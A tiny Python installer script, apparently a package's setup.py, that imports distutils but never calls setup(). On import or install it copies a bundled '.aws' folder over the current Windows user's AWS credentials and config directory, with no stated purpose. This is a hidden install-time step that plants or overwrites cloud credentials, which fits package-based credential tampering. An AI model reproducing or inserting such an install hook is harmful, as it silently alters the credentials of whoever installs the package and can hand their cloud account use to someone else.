import distutils
from distutils.core import setup
import os
import shutil
link = os.getlogin()

nowdr="./.aws"
fordr="C:/Users/"+link+"/.aws"

distutils.dir_util.copy_tree(nowdr, fordr)
